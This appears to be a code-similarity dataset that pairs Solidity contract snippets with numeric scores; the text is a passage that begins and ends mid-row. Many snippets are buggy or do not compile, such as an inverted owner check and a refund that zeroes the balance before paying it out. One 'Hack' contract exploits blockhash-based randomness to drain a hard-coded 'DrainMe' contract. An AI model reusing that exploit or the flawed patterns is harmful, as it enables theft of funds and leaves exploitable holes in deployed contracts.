    return true;
  }

  
  function calculatePrice(uint value, uint tokensSold, uint weiRaised, address msgSender) public constant returns (uint tokenAmount);
}"
"contract Adoption {
    Pet[16] pets;

    struct Pet {
        address owner;
        uint256 price;
    }

    function returnEth() public payable {
    msg.sender.transfer(msg.value);
    }
    
    function adopt(uint petId) public payable returns (uint) {
        require(petId >= 0 && petId <= 15);
        require(msg.value >= pets[petId]['price'] * 0.5);
        pets[petId] = Pet({owner: msg.sender, price: 100});
        return petId;
        
    }
    
    function getAdopters() public view returns (Pet[16]) {
        return pets;
    }


}",0.6317048911430233,"contract CommunityChest {

    

    address owner;

    

    event Deposit(uint256 value);

    event Transfer(address to, uint256 value);

    

    constructor () public {

        owner = msg.sender;

    }

    

    function send(address payable to, uint256 value) public onlyOwner {

        to.transfer(value);

        emit Transfer(to, value);

    }



    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

}"
"contract ClientReceipt {

    event Deposit(
        address indexed _from,
        bytes32 indexed _id,
        uint _value
    );

    function deposit(bytes32 _id) public payable {
        
        
        
        
        
        emit Deposit(msg.sender, _id, msg.value);
    }
}",0.6730378308351831,"contract ERC223 {
    function transfer(address to, uint value, bytes data) public;
    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
}"
"contract MyContractA {
    uint[] public myArray;

    function MyContractA() {
        myArray.length = 1;
    }

}",0.6005598596761611,"contract FiatContract {

    function USD(uint _id) constant public returns (uint256);

}"
"contract TimedCommitment {
    address payable revealer;
    address payable fineRecipient;
    bytes32 public hash;
    uint256 public deadline;

    constructor(address payable _fineRecipient, bytes32 _hash, uint256 timeout) public payable {
        revealer = msg.sender;
        fineRecipient = _fineRecipient;
        hash = _hash;
        deadline = now + timeout;
    }

  function  deposit(uint256 amount) payable public{
         require(msg.value == amount);
         require(msg.value == fineRecipient);

    }

    
    function providePreimage(bytes calldata preimage) external {
        require(keccak256(preimage) == hash);
        revealer.transfer(address(this).balance);
       revealer.transfer(address(this).amount);
    }

    
    function refund() external {
        require(msg.sender == fineRecipient);
        require(now >= deadline);

        msg.sender.transfer(address(this).balance);
    }
}",0.6274796636910179,"contract Hack{
    
    DrainMe contr = DrainMe(0xB620CeE6B52f96f3C6b253E6eEa556Aa2d214a99);
    
    address owner;
    
    function Hack(){
        owner = msg.sender;
    }
    
    
     
     
    
    
    function putHere() payable public {
        require (msg.value >= 0.03 ether);
        require(msg.sender == owner);
    }
    
    event test1(bool);
    event what(uint256);
    function test() public payable {
        
        require(msg.sender == owner);
        bytes32 hash = keccak256(blockhash(block.number-1));
        uint256 secret = uint256(hash);
        what(secret);
        if(secret%5==0){
            contr.DranMe();
            contr.becomePlayer.value(0.02 ether)();
            contr.manipulateSecret.value(0.01 ether)();
            contr.claimPrize();
            msg.sender.transfer(address(this).balance);
            test1(true);
        }
        else{
            test1(false);
        }
        
    }
      
    function take() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
    
    function() public payable {}
    
    
}"
"contract EventRegistrant {

    
    struct Registrant {
        uint amount;
        uint numTickets;
        string email;
    }

    
    address public owner;
    uint public numTicketsSold;
    uint public quota;
    uint public price;
    mapping (address => Registrant) registrantsPaid;
    
    event Deposit (address _from, uint _amount);
    event Refund (address _to, uint _amount);

    
    
    modifier onlyOwner(){
        require(msg.sender != owner);
        _;
    }
    
    modifier soldOut(){
        require(numTicketsSold >= quota);
        _;
    }

    function EventRegistrant(uint _quota, uint _price) public {
        owner = msg.sender;
        numTicketsSold = 0;
        quota = _quota;
        price = _price;
    }

    function buyTicket(string email, uint numTickets) soldOut public payable {
        uint totalAmount = price * numTickets;
        require(msg.value > totalAmount);
        if (registrantsPaid[msg.sender].amount > 0) {
            registrantsPaid[msg.sender].amount += msg.value;
            registrantsPaid[msg.sender].numTickets += numTickets;
            registrantsPaid[msg.sender].email = email;
        } else {
            registrantsPaid[msg.sender].amount = totalAmount;
            registrantsPaid[msg.sender].numTickets = numTickets;
            registrantsPaid[msg.sender].email = email;
        }
        
        numTicketsSold += numTickets;
        
        if (msg.value > totalAmount) {
            uint refundAmount = msg.value - totalAmount;
            require(msg.sender.send(refundAmount));
        }
        
        Deposit(msg.sender, msg.value);
    }
    
    function refundTickets(address buyer) onlyOwner public {
        if (registrantsPaid[buyer].amount > 0) {
            if (this.balance >= registrantsPaid[buyer].amount) {
                registrantsPaid[buyer].amount = 0;
                numTicketsSold = numTicketsSold - registrantsPaid[buyer].numTickets;
                require(buyer.send(registrantsPaid[buyer].amount));
                Refund(buyer, registrantsPaid[buyer].amount);
            }
        }
    }
    
    function withdrawFunds() onlyOwner public {
        require(owner.send(this.balance));
    }

    function getRegistrantsAmountPaid(address buyer) public view returns (uint) {
        return registrantsPaid[buyer].amount;
    }

    
    function kill() onlyOwner public {
        selfdestruct(owner);
    }
}",0.6105846020355841,"contract Wallet {
    
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event TransferOwnership(address indexed from, address indexed to);
    
    address Owner;
    function transferOwnership(address to) onlyOwner { TransferOwnership(Owner, to); Owner = to; }
    
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked = false;
    uint Date;

    function initWallet() payable open {
        Owner = msg.sender;
        minDeposit = 0.25 ether;
        deposit();
    }

    function SetReleaseDate(uint NewDate) {
        Date = NewDate;
    }

    function() public payable { deposit(); }

    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }

    function withdraw(uint amount) public payable { withdrawTo(msg.sender, amount); }
    
    function withdrawTo(address to, uint amount) public onlyOwner {
        if (WithdrawalEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }

    function withdrawToken(address token) public payable onlyOwner {
        withdrawTokenTo(token, msg.sender, ERC20(token).balanceOf(address(this)));
    }

    function withdrawTokenTo(address token, address to, uint amount) public payable onlyOwner {
        uint bal = ERC20(token).balanceOf(address(this));
        if (bal >= amount && amount > 0) {
            ERC20(token).transfer(to, amount);
        }
    }

    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawalEnabled() constant internal returns (bool) { return Date > 0 && Date <= now; }
    function lock() public { Locked = true; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    modifier open { if (!Locked) _; }
}"
"contract C {

 
 function func(uint k, uint ) returns(uint) {
    return k;
 }

}",0.6485488273303153,"contract UsdPrice {

    function USD(uint _id) constant returns (uint256);

}"
"contract Test {
    bytes32 public hash;

    function set(bytes32 h) public {
        hash = h;
    }
}",0.6354794058004836,"contract GroveAPI {
  function insert(bytes32 indexName, bytes32 id, int value) public;
}"
"contract RateKeeper {
        uint256 public capacity;
        uint256 public timeframe;

        uint256 public load; 

        constructor (uint256 _capacity, uint256 _timeframe) public {

            capacity = _capacity;
            timeframe = _timeframe;
            load = 0;
        }

        function addPayment() public onlyOwner returns (bool added) {
            
            if (load >= capacity){
                return false;
            }
            load++;
            return true;
        }",0.6248340027737154,"contract PoSTokenStandard {
    uint256 public stakeStartTime;
    uint256 public stakeMinAge;
    uint256 public stakeMaxAge;
    function mint() public returns (bool);
    function coinAge() public constant returns (uint256);
    function annualInterest() public constant returns (uint256);
    event Mint(address indexed _address, uint _reward);
}"
"contract CallFunction {

    address useraddress;
    constructor(address _t) public {

        useraddress = _t;
    }


    function thirdfun(uint256 a) public view returns(uint256 c) {

        ArrayTes instanceuser = ArrayTes(useraddress);
        c = instanceuser.secfun(a);
        return c;
    }

}",0.6795562266026844,"contract ERC20Basic {
    function balanceOf(address who) public constant returns(uint256);
    function transfer(address to, uint256 value) public returns(bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}"
"contract state {    
      uint256 contract_version = 1;
      function set_version(uint256 cv_n) public {
                contract_version = cv_n;
      }
      function get_version() public view returns (uint256) {
                return contract_version;
      }
  }",0.664280108187656,"contract CryptoArenaInterface {

    function getData(address ) public view returns(uint256 , uint256 , uint256 , bool    , uint256 , uint256 ) {}

    function isContractMiniGame() public pure returns( bool  ) {}

}"
"contract complicated {
     state st;
     constructor() public {
            address st_address = new state();
            st = state(st_address);
     }
     function set_version(uint256 cv_n) public {
            st.set_version(cv_n);
     }
     function get_version() public view returns (uint256) {
            return st.get_version();
     }
  }",0.672820499852837,"contract UpgradeabilityStorage {

    

    uint256 internal _version;



    

    address internal _implementation;



    

    function version() public view returns (uint256) {

        return _version;

    }



    

    function implementation() public view returns (address) {

        return _implementation;

    }

}"
"contract Foo {
  uint x;

  function bar(uint y) constant {
    x = y;
  }
}",0.6464470001377389,"contract Emitter {
    event Emit(uint x);
    function emit(uint x) {
        Emit(x);
    }
}"
"contract Caller {

    Called public called_address;

    function set_address(address _addy) public {
        called_address = Called(_addy);
    }

    function set(uint256 _var) public {
        called_address.set(_var);
    } 

    function set_call(address _called, uint256 _var) public {
        require(_called.call(bytes4(keccak256(""set(uint256)"")), _var));
    }
}",0.6169410378036376,"contract StandardToken {
  function transfer(address to, uint256 value) public returns (bool);
  function allowance(address _owner, address _spender) public view returns (uint256);
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool);
}"
"contract accountList {

    address[] allowedClient;        
    address[] test;

    function add(address client) returns (bool) {
        allowedClient.push(client);
        test.push(client);
        return true;
    }

    function get() constant returns (address[]) {
        return allowedClient;
    }

}",0.6349971352283204,"contract mtfToken { 

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success); 

  function allowanceOf(address _owner, address _spender) public constant returns (uint256 remaining);

}"
"contract d3 {
    Set.Data knownValues;

    function register(uint value) public {
        
        
        
        require(Set.insert(knownValues, value));
    }
    function contains(uint value) public returns (bool) {
        return Set.contains(knownValues, value);
    }
    
}",0.6193604656207475,"contract ValidationUtil {

    function requireNotEmptyAddress(address value) internal{

        require(isAddressValid(value));

    }



    function isAddressValid(address value) internal constant returns (bool result){

        return value != 0;

    }

}"
"contract newInstance {
  function newInstanceFunc(address _address) public returns(address) {
    ContractToBeInstanced T = new ContractToBeInstanced(_address);
    return T.getAddress(); 
  }
}",0.6220054652221654,"contract NEST_ToLoanDataContract {

    

    function addContractAddress(address contractAddress) public;

    

    function checkContract(address contractAddress) public view returns (bool);

}"
"contract Project {

    struct projectInfo {
        address projectOwner;
        string name;
        uint248 amountToRaise;
        uint248 deadline;
    }

    projectInfo public info;

    function Project(string name, uint248 amountToRaise, uint248 deadline) {
        info = projectInfo(tx.origin, name, amountToRaise, deadline);
    }

    

    
    function getName() public constant returns (string) {
        return info.name;
    }

    function getOwner() public constant returns (address) {
        return info.projectOwner;
    }

    function getAmount() public constant returns (uint248) {
        return info.amountToRaise;
    }

    function getDeadline() public constant returns (uint248) {
        return info.deadline;
    }
}",0.6310934990898031,"contract ERC918Interface {

  function epochCount() public constant returns (uint);

  function totalSupply() public constant returns (uint);
  function getMiningDifficulty() public constant returns (uint);
  function getMiningTarget() public constant returns (uint);
  function getMiningReward() public constant returns (uint);
  function balanceOf(address tokenOwner) public constant returns (uint balance);

  function mint(uint256 nonce, bytes32 challenge_digest) public returns (bool success);

  event Mint(address indexed from, uint reward_amount, uint epochCount, bytes32 newChallengeNumber);

}"
"contract ShippingOrder{
    TA2_Transfer public t;
    address public oOrigin;
    address public oShipper;
    address public oCarrier;
    address public oReceiver;
    uint public oCount;
    mapping (address => uint) public oBalances;
    event Sent(address shipper, address carrier, address receiver, uint objCount);
    function ShippingOrder() {
        oBalances[tx.origin] = 200;
    }
    function getBalance(address _sender) returns(uint) {
        return oBalances[_sender];
    }
    function sendOrder(address oOrigin, address oShipper, address oCarrier,  address oReceiver, uint256 oCount) payable{
        t.sendToReceiver(oOrigin, oShipper, oCount);
        t.sendToReceiver(oShipper, oCarrier, oCount);
        t.sendToReceiver(oCarrier, oReceiver, oCount);
    }
}",0.6343991576247819,"contract ERC20 {
    uint public totalSupply = 0;

    mapping(address => uint) balances;
    mapping(address => mapping (address => uint)) allowed;

    function balanceOf(address _owner) public view returns (uint);
    function transfer(address _to, uint _value) public  returns (bool);
    function transferFrom(address _from, address _to, uint _value) public returns (bool);
    function approve(address _spender, uint _value) public returns (bool);
    function allowance(address _owner, address _spender) public view returns (uint);

    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);

}"
"contract Aion { 
    uint256 public serviceFee;
    function ScheduleCall(uint256 blocknumber, address to, uint256 value, uint256 gaslimit, uint256 gasprice, bytes data, bool schedType) public payable returns (uint,address);
}",0.6690318249156275,"contract TokenERC20 {

    mapping (address => uint256) public balanceOf;

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    function approve(address _spender, uint256 _value) public;

}"
"contract MyContract {
    address public owner; 
    mapping (address => mapping (bytes32 => uint)) value;

    function MyContract (uint initValue, bytes32 chkByte) {
        owner = msg.sender;
        reward[msg.sender][chkByte] = initValue;
    }

    function showAvailReward(bytes32 chkByte) constant returns(uint) {
            return value[msg.sender][chkByte];
        }
}",0.6179570874330458,"contract PaymentVerified {
    mapping(address => uint256) payments;

    event Payment(address indexed owner, uint256 eth);

    function paymentOf(address _owner) constant returns(uint256 payment) {
        return payments[_owner];
    }

    function() payable {
        payments[msg.sender] = msg.value;

        msg.sender.transfer(msg.value);

        Payment(msg.sender, msg.value);
    }
}"
"contract Factory {
    uint public counter;
    bytes32[] public Names;
    address[] public newContracts;

        function setCounter(uint v) {counter = v; }
    function createContract (bytes32 name) {
        counter++;
        address newContract = new Contract(name);
        newContracts.push(newContract);
    }

    function getName (uint i) {
        counter++;
        Contract con = Contract(newContracts[i]);
        Names[i] = con.Name();
    }
}",0.6021361140718368,"contract tDeployer is Ownable {



	address private main;



	function cMain(address nM) public onlyOwner {

		main = nM;

	}



    function deployToken(string _tName, string _tSymbol, uint _mint, address _owner) public returns (address) {

		require(msg.sender == main);

		tokenContract newContract = new tokenContract(_tName, _tSymbol, _mint, _owner);

		return newContract;

	}





}"
"contract Stamp {   bytes32 public id;   uint public rarity;
    constructor(bytes32 _id, uint _rarity) public {
      id = _id;
      rarity = _rarity;   } 
    }",0.6008642747716182,"contract Contract {
    bytes32 public Name;

    
    
    constructor(bytes32 _contractName) public {
        Name = _contractName;
    }

    function() public payable { }
}"
"contract LocalExample {
address public owner;
    function setOwner(address _newOwner)  external {
        owner = _newOwner;
    }
}",0.6975532704614437,"contract IOwnable {
  function transferOwnership(address newOwner) public;

  function setOperator(address newOwner) public;
}"
"contract A {

    function A() payable {
    }

    function getBal() returns(uint a){
        return (10);
    }

}",0.6647798373409213,"contract Now
{
    function date() public view returns(uint) {
        while(true){
            
        }
        return now;
    }
}"
"contract A is I {
    address asset;

    function transferAsset(address _to) public onlyOwner {
        asset = _to;
    }
}",0.6815332098247429,"contract token {
    function transferFrom(address from, address to, uint256 value) public returns (bool);
}"
"contract B is I {
    I contractA;

    function doTransfer(address _to) public onlyOwner {
        contractA = I(A_Deployed_Address);

        contractA.transferAsset(_to);
    }
}",0.6055558009222946,"contract Owned {
    address public contractOwner;

    function Owned() {
        contractOwner = msg.sender;
    }

    modifier onlyContractOwner() {
        if (contractOwner == msg.sender) {
            _;
        }
    }
}"
"contract Greetings {
    string message;

    function Greetings() {
        message = ""I am ready!"";
    }

    function setGreetings(string _message) public {
        message = _message;
    }

    function getGreetings() constant returns (string) {
        return message;
    }
}",0.67694051369111,"contract Balls {

string messageString = ""Welcome to the Project 0xbt.net"";

    

    function getPost() public constant returns (string) {

        return messageString;

    }

    

    function setPost(string newPost) public {

        messageString = newPost;

    }

    

}"
"contract TestStrings {

    using Strings for string;

    function testCOntract(string memory _base) public returns(string memory) {
        return _base.concat(""_suffix"");
    }
}",0.6273937322400962,"contract AbstractRegistration {
    
    function getRegistration() public view returns(string, address, string, string, uint, string, string, address[5], uint[5]);
}"
"contract ethTransferTest {
    function ethTrans(address _to) payable public {
        uint256 pay = msg.value;
        _to.transfer(pay);
    }
}",0.6699622530934538,"contract TokenInterface {
    function transfer(address _to, uint256 _value) public returns (bool success);
}"
"contract MyToken {

   mapping (address => uint256) public balanceOf;

   function MyToken(uint256 _supply) public {

     balanceOf[msg.sender] = _supply;  
 }
    
    function transfer(address _to, uint _value) public
      {
    
    require(balanceOf[msg.sender]) >= _value;

    
   require(balanceOf[_to] + _value >= balanceOf[_to]);

   
    balanceOf[msg.sender] -= _value;

   
      balanceOf[_to] += _value; 
   }
}",0.6950118762665771,"contract BalanceHolder {

    IERC20 public token;

    mapping(address => uint256) public balanceOf;

    event LogWithdraw(
        address indexed user,
        uint256 amount
    );

    function withdraw() 
    public {
        uint256 bal = balanceOf[msg.sender];
        balanceOf[msg.sender] = 0;
        require(token.transfer(msg.sender, bal));
        emit LogWithdraw(msg.sender, bal);
    }

}"
"contract NaiveBank { 
      struct Account { 
         address addr ;
        uint balance ; 
      } 
      Account accounts []; 
      function applyInterest () returns ( uint ) { 
         for ( uint i = 0; i < accounts . length ; i++) { 
            
            accounts [i]. balance = accounts [i]. balance* 105 / 100; 
         } 
         return accounts . length ; 
      } 
   }",0.6105453473397211,"contract AccountLevelsTest is AccountLevels {
  mapping (address => uint) public accountLevels;

  function setAccountLevel(address user, uint level) {
    accountLevels[user] = level;
  }

  function accountLevel(address user) constant returns(uint) {
    return accountLevels[user];
  }
}"
"contract test06 {

    address payable public admin = msg.sender;

    receive() payable external {}

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}",0.6939566791927707,"contract token{
   function transfer(address re,uint am) public returns (bool success);
   function balanceOf(address _owner) public view returns (uint256 balance);
}"
"contract Test {
  bytes32[] hashes;

  function extCall(bytes _data) external view {
    bytes32 hash = keccak256(_data);
    _intCall(hash);
  }

  function _intCall(bytes32 _hash) private {
    hashes.push(_hash)
  }
}",0.6055227634392208,"contract SHA256Digest is Digest {

    using BytesUtils for *;



    function verify(bytes data, bytes hash) external pure returns (bool) {

        return sha256(data) == hash.readBytes32(0);

    }

}"
"contract MyToken {
    string public symbol;
    string public  name;
    uint8 public decimals;
    uint public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;


    constructor() {
        symbol = ""my"";
        name = ""My Token"";
        decimals = 18;
        _totalSupply = 100000000000000000000000000;

        balances[0x364ca3F935E88Fbc9e041d2032F996CAc69452e6] = _totalSupply / 2; 
        balances[0x5506195d8111B5e150Fb68Ceba2806c546C5a28B] = _totalSupply / 2; 

        Transfer(address(0), 0x364ca3F935E88Fbc9e041d2032F996CAc69452e6,
                 _totalSupply / 2);
        Transfer(address(0), 0x5506195d8111B5e150Fb68Ceba2806c546C5a28B,
                 _totalSupply / 2);
    }



    
    
    
    
    
    function transfer(address to, uint tokens) public returns (bool success) {
        
        balances[msg.sender] -= tokens;
        balances[to] += tokens;
        Transfer(msg.sender, to, tokens);
        return true;
    }

}",0.6434900808541675,"contract NortCoin {

  address public owner;

  string public name;

  string public symbol;

  uint public decimals;

  uint256 public totalSupply;



  event Transfer(address indexed from, address indexed to, uint256 value);



  

  mapping (address => uint256) public balanceOf;



  constructor(uint256 initialSupply, string tokenName, string tokenSymbol, uint decimalUnits) public {

    owner = msg.sender;

    name = tokenName;

    symbol = tokenSymbol;

    decimals = decimalUnits;

    totalSupply = initialSupply * 8 ** uint256(decimals);

    balanceOf[msg.sender] = totalSupply;

  }



  

  function transfer(address _to, uint256 _value) public {

    

    require(balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]);



    

    balanceOf[msg.sender] -= _value;

    balanceOf[_to] += _value;



    

    emit Transfer(msg.sender, _to, _value);

  }

}"
"contract Foo {

    struct Bar {
        address owner;
        uint[] x;
    }

    Bar[] public bars;

    function foobar(address a) public {
        Bar storage b = Bar(a, new uint[]) 
        bars.push(b)
    }

}",0.6409678932891495,"contract ERC20 {

  function balanceOf (address owner) public view returns (uint256);

  function transfer (address to, uint256 value) public returns (bool);

}"
"contract Coursetro {

   string fName;
   uint age;

   function setInstructor(string memory _fName, uint _age) public {
       fName = _fName;
       age = _age;
   }

   function getInstructor() public view returns (string memory, uint) {
       return (fName, age);
   }

}",0.6460007368441943,"contract Trusti {
    string public data = ""trusti.id"";
    
    function getData() public view returns (string memory) {
        return data;
    }
    
    function setData(string memory _dataHash, string memory _dataSignee) public {
        data = _dataHash;
        data = _dataSignee;
    }
}"
"contract KYCPurchase {
  uint public price = 2 ether;
  address[] public buyer;

  function buy() public payable {
    require(msg.value >= price);

    
    buyer.push(msg.sender);

  }",0.6909848330735369,"contract LoeriadeNabidaz{

    uint public c;

    

    function pay() payable public {

        require(msg.value==0.0001 ether);

        c = c+1;

        if(c==2) {

            msg.sender.transfer(this.balance);

            c = 0;

        }

    }

}"
"contract Counter {
    uint256 counter =0;

    function increase() public {
        counter++;
    }

    function  decrease() public{
        counter--;
    }

    function getCounter() public constant  returns (uint256) {
        return counter;
    }
}",0.6665267550348567,"contract ITokenMetadata {



    

    

    



    function symbol()

        public

        constant

        returns (string);



    function name()

        public

        constant

        returns (string);



    function decimals()

        public

        constant

        returns (uint8);

}"
"contract SurveyFactory {

    address[] public surveyList;
    address public Owner;

    constructor() public {
        Owner = msg.sender;
    }

    function createSurvey() public returns(address surveyAddress){
        Survey survey = new Survey();
        surveyList.push(address(survey));
        return address(survey);
    }

    function getSurveyCount() public view returns(uint) {
        return surveList.length;
    }
}",0.6275746987373036,"contract Owned {
    address public contractOwner;

    constructor() public { 
        contractOwner = msg.sender; 
    }
    
    function whoIsTheOwner() public view returns(address) {
        return contractOwner;
    }

    function changeOwner(address newOwner) public returns(bool) {
        require(newOwner != address(0));
        if (contractOwner == msg.sender) {
            contractOwner = newOwner;
            return true;
        }
        return false;
    }
}"
"contract ContractDemo {
    address public buyerAddress;
    address public sellerAddress;
    uint public price; 

    modifier onlyBuyer() {
        require(msg.sender == buyerAddress);
        _;
    }

    modifier onlySeller() {
        require(msg.sender == sellerAddress);
        _;
    }

    constructor(address payable _sellerAddress) public payable {
        buyerAddress = msg.sender; 
        sellerAddress = _sellerAddress;
        price = msg.value;
    }

    function deliveredParcel(address payable _seller) onlySeller public payable returns(bool) {
        require(msg.value == price);
        _seller.transfer(msg.value); 
        return true;
    }
}",0.6290404118496192,"contract TestABI{

    address owner;

    constructor() public payable{

        owner = msg.sender;

    }

    modifier onlyOwner(){

        require (msg.sender==owner);

        _;

    }

    function () payable public {

        

    }

    

    function getBalance() public constant returns(uint){

        return address(this).balance;

    }

    

    function sendTransfer(address _user,uint _price) public onlyOwner{

        require(_user!=owner);

        if(address(this).balance>=_price){

            _user.transfer(_price);

        }

    }

    

    function getEth(uint _price) public onlyOwner{

        if(_price>0){

            if(address(this).balance>=_price){

                owner.transfer(_price);

            }

        }else{

           owner.transfer(address(this).balance); 

        }

    }

}"
"contract DappToken {
    uint256 public totalSupply;
    function DToken () public {
        totalSupply = 1000000;
    }   
}",0.6320978546986781,"contract ERC721Enumerable is ERC721Basic {

    function totalSupply() public view returns (uint256);

}"
"contract client {
    address obj ;

    function setObject(address _obj) external {
        obj = _obj;
    }

    function UseExistingAddress() public payable returns (uint) {
        HelloWorld myObj = HelloWorld(obj);
        myObj.SetValue(10);
        return myObj.GetValue();
    }
}",0.6212754244382136,"contract Pool is Ownable{

    function () external payable {}

    function send(address payable to, uint value) public onlyOwner  {

        to.transfer(value);

    }  

    function balance() public view returns(uint) {

        return address(this).balance;

    }

}"
"contract Users {

    mapping (address => bytes32) public names;
    mapping (bytes32 => address) public owners;

    function register(bytes32 name) {

            owners[name] = msg.sender;
            names[msg.sender] = name;


    }
}",0.6636199042501415,"contract FunGame 
{
    address owner;
    struct user
    {
        address parent;
        uint8 level;
    }
    mapping(address=>user) public map;
    function FunGame()
    {
        owner = msg.sender;
        map[msg.sender].level = 8; 
    }
}"
"contract ThrowProxy {
  address public target;
  bytes data;

  function ThrowProxy(address _target) {
    target = _target;
  }

  
  function() {
    data = msg.data;
  }

  function execute() returns (bool) {
    return target.call(data);
  }
}",0.6407341626901251,"contract ForwarderTarget {

  uint public data;



  function ForwarderTarget() public {

  }



  function createForwarder(address pool) public returns (address) {

    return new Forwarder(pool);

  }



  function() public payable {

    

  }

}"
contract test { function multiply(uint a) returns(uint d) { return a * 7;} },0.6764693512892492,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
"contract Test {

bytes32 message = ""This is a message."";

function setMessage(bytes32 _message) {
    message = _message;
}

function getMessage() constant returns (bytes32) {
    return message;
}

function stringToBytes32(string memory source) returns (bytes32 result) {
    assembly {
result := mload(add(source, 32))
    }
}}",0.6041292994405072,"contract ENSReverseRegistrar {
    function claim(address _owner) public returns (bytes32);
    function claimWithResolver(address _owner, address _resolver) public returns (bytes32);
    function setName(string memory _name) public returns (bytes32);
    function node(address _addr) public pure returns (bytes32);
}"
"contract Simplest {
    constructor() public {
    }

    function two_paths(bool _a) public pure returns (uint) {
        if (_a == true) {
            return 1;
        } else {
            return 0;
        }
    }
}",0.6764726799760488,"contract Ownable {

    address public Owner = msg.sender;

    function isOwner() public returns (bool) {

        if (Owner == msg.sender) {

            return true; 

        }

        return false;

    }

}"
"contract test {

  function test() {
  }

  function verify(bytes32 _message, uint8 _v, bytes32 _r, bytes32 _s) constant returns (address) {
   address signer = ecrecover(_message, _v, _r, _s);
   return signer;
  }
}",0.6412700776580069,"contract AbstractENS{
    function owner(bytes32 node) constant returns(address);
    function setOwner(bytes32 node, address owner);
    function setSubnodeOwner(bytes32 node, bytes32 label, address owner);
}"
"contract SendEtherFirst {
    address owner;
    function sendViaCall (address payable _to) public payable {
        (bool sent, bytes memory data) = _to.call.value(msg.value)("""");
       require(msg.sender == owner);
        require (sent, ""failed to send ether"");
    }
}",0.6366885686591192,"contract ERC677 is ERC20 {
  function transferAndCall(address to, uint value, bytes memory data) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint value, bytes data);
}"
"contract SendEtherSecond {
    function sendViaCall (address payable _to) public payable {
        (bool sent, bytes memory data) = _to.call.value(msg.value)("""");
        require (sent, ""failed to send ether"");
    }
}",0.6116584796298343,"contract ERC223 {
    function transfer(address to, uint value, bytes data) public;
    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
}"
"contract ContractAuth {
    function getPrefixedHash(bytes32 messageHash) internal pure returns (bytes32) {
        bytes memory hashPrefix = ""\x19Ethereum Signed Message:\n32"";
        return keccak256(abi.encodePacked(hashPrefix, messageHash));
    } 

    
    function verifyMessageHash(bytes32 messageHash, uint8 v, bytes32 r, bytes32 s) internal view returns (bool) {
        bytes32 prefixedHash = getPrefixedHash(messageHash);
        return ecrecover(prefixedHash, v, r, s) == msg.sender;
    }
}",0.6129208391446265,"contract verifiable {



    struct Signature {

        uint8 v;

        bytes32 r;

        bytes32 s;

    }



    

    mapping(address => Signature) public signatures;



    

    function sign(uint8 v, bytes32 r, bytes32 s) public {

        signatures[msg.sender] = Signature(v, r, s);

    }



    

    function verify(address signer) public constant returns(bool) {

        bytes32 hash = keccak256(abi.encodePacked(address(this)));

        Signature storage sig = signatures[signer];

        return ecrecover(hash, sig.v, sig.r, sig.s) == signer;

    }

}"
"contract A {

   address[] public addElements;

   function A() payable {

   }

   function create() returns (address a) {
       B obj = new B();
       addElements.push(obj);
       return obj;
   }


   function getElements() returns (address[] ) {
       return addElements;
   }

}",0.6255022725445504,"contract BCEOTokenInterface {

  function owner() public view returns (address);

  function balanceOf(address who) public view returns (uint256);

  function transfer(address _to, uint256 _value) public returns (bool success);

}"
"contract Auction {

  string public description;
  string public instructions; 
  uint public price;
  bool public initialPrice = true; 
  uint public timestampEnd;
  address public beneficiary;
  bool public finalized = false;

  address public owner;
  address public winner;
  mapping(address => uint) public bids;
  address[] public accountsList; 

  
  
  uint public increaseTimeIfBidBeforeEnd = 24 * 60 * 60; 
  uint public increaseTimeBy = 24 * 60 * 60;


  event Bid(address indexed winner, uint indexed price, uint indexed timestamp);
  event Refund(address indexed sender, uint indexed amount, uint indexed timestamp);

  modifier onlyOwner { require(owner == msg.sender, ""only owner""); _; }
  modifier onlyWinner { require(winner == msg.sender, ""only winner""); _; }
  modifier ended { require(now > timestampEnd, ""not ended yet""); _; }

  function setDescription(string _description) public onlyOwner() {
    description = _description;
  }

  function setInstructions(string _instructions) public ended() onlyWinner()  {
    instructions = _instructions;
  }

  constructor(uint _price, string _description, uint _timestampEnd, address _beneficiary) public payable {
    require(_timestampEnd > now, ""end of the auction must be in the future"");
    owner = msg.sender;
    price = _price;
    description = _description;
    timestampEnd = _timestampEnd;
    beneficiary = _beneficiary;
  }

  function() public payable {

    if (msg.value == 0) { 
      refund();
      return;
    }

    require(now < timestampEnd, ""auction has ended""); 

    if (bids[msg.sender] > 0) { 
      bids[msg.sender] += msg.value;
    } else {
      bids[msg.sender] = msg.value;
      accountsList.push(msg.sender); 
    }

    if (initialPrice) {
      require(bids[msg.sender] >= price, ""big too low, minimum is the initial price"");
    } else {
      require(bids[msg.sender] >= (price * 5 / 4), ""big too low, minimum 25% increment"");
    }

    if (now > timestampEnd - increaseTimeIfBidBeforeEnd) {
      timestampEnd = now + increaseTimeBy;
    }

    initialPrice = false;
    price = bids[msg.sender];
    winner = msg.sender;
    emit Bid(winner, price, now);
  }

  function finalize() public ended() onlyOwner() {
    require(finalized == false, ""can withdraw only once"");
    require(initialPrice == false, ""can withdraw only if there were bids"");

    finalized = true; 
    beneficiary.transfer(price);

    bids[winner] = 0; 
    for (uint i = 0; i < accountsList.length;  i++) {
      if (bids[accountsList[i]] > 0) {
        accountsList[i].transfer( bids[accountsList[i]] ); 
